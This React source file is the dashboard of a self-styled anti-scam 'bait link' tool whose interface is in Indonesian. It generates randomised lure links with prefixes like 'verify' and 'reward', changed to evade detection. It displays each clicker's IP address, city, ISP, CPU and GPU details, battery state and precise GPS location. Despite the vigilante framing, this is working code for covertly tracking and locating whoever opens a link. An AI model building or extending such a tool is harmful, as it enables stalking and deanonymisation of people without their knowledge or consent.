import React, { useState, useEffect } from 'react';
import { Shield, MapPin, Smartphone, Globe, Trash2, ExternalLink, RefreshCcw } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const Dashboard = () => {
  const [logs, setLogs] = useState([]);
  const [isRefreshing, setIsRefreshing] = useState(false);

  const generateRandomLink = () => {
    const randomStr = Math.random().toString(36).substring(2, 15);
    const prefixes = ['v', 't', 'secure', 'verify', 'reward'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return `${window.location.origin}/${prefix}/${randomStr}`;
  };

  const [currentBaitLink, setCurrentBaitLink] = useState(generateRandomLink());

  const loadLogs = () => {
    setIsRefreshing(true);
    const data = JSON.parse(localStorage.getItem('scam_logs') || '[]');
    setLogs(data);
    setTimeout(() => setIsRefreshing(false), 800);
  };

  useEffect(() => {
    loadLogs();
  }, []);

  const clearLogs = () => {
    if (window.confirm('Hapus semua data pancingan?')) {
      localStorage.removeItem('scam_logs');
      setLogs([]);
    }
  };

  const getMapsUrl = (lat, lon) => `https://www.google.com/maps?q=${lat},${lon}`;

  return (
    <div className="container" style={{ padding: '40px 0' }}>
      <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '48px' }}>
        <div>
          <h1 style={{ fontSize: '32px', fontWeight: '900', display: 'flex', alignItems: 'center', gap: '12px' }}>
            <Shield size={36} color="#3b82f6" />
            SCAM <span style={{ color: '#3b82f6' }}>SENTINEL</span>
          </h1>
          <p style={{ color: 'var(--text-muted)', marginTop: '4px' }}>Control Center for Heroic Anti-Scam Operations</p>
        </div>
        <div style={{ display: 'flex', gap: '12px' }}>
          <button className="btn-secondary" onClick={loadLogs} disabled={isRefreshing}>
            <RefreshCcw size={18} className={isRefreshing ? 'animate-spin' : ''} />
          </button>
          <button className="btn-secondary" onClick={clearLogs} style={{ color: '#ef4444' }}>
            <Trash2 size={18} />
          </button>
        </div>
      </header>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '24px', marginBottom: '40px' }}>
        <div className="glass-card" style={{ padding: '24px' }}>
          <h3 style={{ color: 'var(--text-muted)', fontSize: '14px', marginBottom: '8px' }}>TOTAL TARGETS</h3>
          <div style={{ fontSize: '36px', fontWeight: '800' }}>{logs.length}</div>
        </div>
        <div className="glass-card" style={{ padding: '24px' }}>
          <h3 style={{ color: 'var(--text-muted)', fontSize: '14px', marginBottom: '8px' }}>LATEST ORIGIN</h3>
          <div style={{ fontSize: '24px', fontWeight: '700' }}>
            {logs[0]?.city || 'N/A'}, {logs[0]?.country_code || '--'}
          </div>
        </div>
      </div>

      <div className="glass-card" style={{ overflow: 'hidden' }}>
        <div style={{ padding: '24px', borderBottom: '1px solid var(--border-color)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h2 style={{ fontSize: '18px' }}>Caught Scammers</h2>
          <span className="status-badge status-online">System Live</span>
        </div>
        
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
            <thead>
              <tr style={{ background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-color)' }}>
                <th style={{ padding: '16px 24px', fontSize: '12px', color: 'var(--text-muted)' }}>TIMESTAMP</th>
                <th style={{ padding: '16px 24px', fontSize: '12px', color: 'var(--text-muted)' }}>IP ADDRESS</th>
                <th style={{ padding: '16px 24px', fontSize: '12px', color: 'var(--text-muted)' }}>LOCATION</th>
                <th style={{ padding: '16px 24px', fontSize: '12px', color: 'var(--text-muted)' }}>ISP</th>
                <th style={{ padding: '16px 24px', fontSize: '12px', color: 'var(--text-muted)' }}>DEVICE</th>
                <th style={{ padding: '16px 24px', fontSize: '12px', color: 'var(--text-muted)' }}>ACTION</th>
              </tr>
            </thead>
            <tbody>
              <AnimatePresence initial={false}>
                {logs.length === 0 ? (
                  <tr>
                    <td colSpan="6" style={{ padding: '60px', textAlign: 'center', color: 'var(--text-muted)' }}>
                      Belum ada penipu yang terpancing. Bagikan link jebakanmu!
                    </td>
                  </tr>
                ) : (
                  logs.map((log) => (
                    <motion.tr 
                      key={log.id}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      style={{ borderBottom: '1px solid var(--border-color)' }}
                    >
                      <td style={{ padding: '16px 24px', fontSize: '14px' }}>
                        {new Date(log.timestamp).toLocaleString('id-ID')}
                      </td>
                      <td style={{ padding: '16px 24px', fontWeight: '600', color: '#3b82f6' }}>{log.ip}</td>
                      <td style={{ padding: '16px 24px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <MapPin size={14} color="#ef4444" />
                          {log.city}, {log.region}
                        </div>
                      </td>
                      <td style={{ padding: '16px 24px', fontSize: '14px' }}>{log.org}</td>
                      <td style={{ padding: '16px 24px' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px', fontSize: '11px' }}>
                          <span style={{ color: '#3b82f6' }}>CPU: {log.cores} Cores</span>
                          <span style={{ color: '#10b981' }}>GPU: {log.gpu?.split(' ').slice(-2).join(' ')}</span>
                          <span style={{ color: log.charging === 'Charging' ? '#10b981' : '#f59e0b' }}>
                            Batt: {log.battery} ({log.charging === 'Charging' ? '🔌' : '🔋'})
                          </span>
                        </div>
                      </td>
                      <td style={{ padding: '16px 24px' }}>
                        <a 
                          href={log.preciseLoc 
                            ? `https://www.google.com/maps?q=${log.preciseLoc.lat},${log.preciseLoc.lng}`
                            : getMapsUrl(log.latitude, log.longitude)} 
                          target="_blank" 
                          rel="noreferrer"
                          className="btn-secondary"
                          style={{ 
                            padding: '6px 12px', 
                            fontSize: '12px', 
                            border: log.preciseLoc ? '1px solid #10b981' : '1px solid #ef4444', 
                            color: log.preciseLoc ? '#10b981' : '#ef4444',
                            display: 'flex',
                            flexDirection: 'column',
                            alignItems: 'center',
                            gap: '2px'
                          }}
                        >
                          <MapPin size={14} /> 
                          {log.preciseLoc ? 'PINPOINT GPS' : 'IP LOCATION'}
                          {log.preciseLoc && <span style={{ fontSize: '9px' }}>Acc: {log.preciseLoc.accuracy}</span>}
                        </a>
                      </td>
                    </motion.tr>
                  ))
                )}
              </AnimatePresence>
            </tbody>
          </table>
        </div>
      </div>

      <div style={{ marginTop: '40px', padding: '32px' }} className="glass-card">
        <h3 style={{ marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '10px' }}>
          <Globe size={20} color="#3b82f6" /> Link Jebakan Anda (Randomized)
        </h3>
        <p style={{ color: 'var(--text-muted)', marginBottom: '20px', fontSize: '14px' }}>
          Gunakan link random ini untuk dibagikan ke penipu. Setiap kali kamu klik "Generate Baru", link akan berubah untuk menghindari deteksi.
        </p>
        <div style={{ display: 'flex', gap: '12px' }}>
          <input 
            readOnly 
            value={currentBaitLink} 
            style={{ 
              flex: 1, 
              background: 'rgba(0,0,0,0.3)', 
              border: '1px solid var(--border-color)', 
              borderRadius: '8px', 
              padding: '12px', 
              color: 'white',
              fontFamily: 'monospace'
            }} 
          />
          <button className="btn-secondary" onClick={() => setCurrentBaitLink(generateRandomLink())}>Generate Baru</button>
          <button className="btn-primary" onClick={() => {
            navigator.clipboard.writeText(currentBaitLink);
            alert('Link jebakan berhasil dicopy!');
          }}>Copy Link</button>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
